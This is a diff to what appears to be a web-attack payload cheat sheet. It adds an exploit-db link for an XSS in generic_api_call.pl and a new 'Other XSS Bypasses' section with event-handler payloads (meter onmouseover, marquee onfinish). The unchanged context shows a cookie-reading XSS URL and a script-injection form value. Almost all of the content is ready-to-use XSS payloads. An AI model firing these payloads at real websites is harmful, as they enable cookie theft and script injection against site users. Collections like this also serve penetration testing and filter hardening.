@@ -2405,7 +2405,7 @@ http://host/index.php/wp-json/wp/v2/users/
 </soapenv:Envelope>
 ```
 
-- `generic_api_call.pl` XSS by [@NNPoster](https://www.exploit-db.com/?author=6654)
+- [`generic_api_call.pl` XSS](https://www.exploit-db.com/exploits/30777) by [@NNPoster](https://www.exploit-db.com/?author=6654)
 ```
 http://host/ws/generic_api_call.pl?function=statns&standalone=%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%3e
 ``` 
@@ -2691,6 +2691,12 @@ value="<script>alert(document.cookie)</script>">
 </form>
 </body>
 </html>
+```
+- [Other XSS Bypasses](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md)
+```
+<meter onmouseover="alert(1)"
+'">><div><meter onmouseover="alert(1)"</div>"
+>><marquee loop=1 width=0 onfinish=alert(1)>
 ```
 
 ### Apache Generic
